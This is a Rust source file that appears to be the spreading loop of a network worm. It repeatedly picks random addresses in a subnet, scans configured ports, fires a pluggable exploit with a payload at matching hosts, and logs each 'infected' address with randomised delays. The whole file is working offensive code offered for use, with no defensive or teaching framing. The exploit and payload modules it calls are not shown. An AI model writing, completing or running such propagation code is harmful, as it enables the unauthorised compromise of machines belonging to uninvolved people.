use crate::config::{random_target, Config};
use crate::exploit::Exploit;
use crate::scanner::Scanner;
use rand::Rng;
use std::sync::Arc;
use tokio::time::{sleep, Duration};

pub async fn run(cfg: Arc<Config>, exploit: Arc<dyn Exploit>, payload: Arc<String>) {
    let scanner = Arc::new(Scanner::new(cfg.concurrency, cfg.scan_timeout_ms));

    loop {
        let cfg = cfg.clone();
        let scanner = scanner.clone();
        let exploit = exploit.clone();
        let payload = payload.clone();

        tokio::spawn(async move {
            let ip = random_target(cfg.subnet_base);
            if let Some(addr) = scanner.probe(ip, &cfg.ports).await {
                if addr.port() == exploit.port() {
                    match exploit.fire(addr, &payload).await {
                        Ok(true) => {
                            eprintln!("[+] infected {}", addr);
                        }
                        Ok(false) => {}
                        Err(e) => eprintln!("[-] {}: {}", addr, e),
                    }
                }
            }

            let (lo, hi) = cfg.jitter_ms;
            let ms = rand::thread_rng().gen_range(lo..=hi);
            sleep(Duration::from_millis(ms)).await;
        });
    }
}
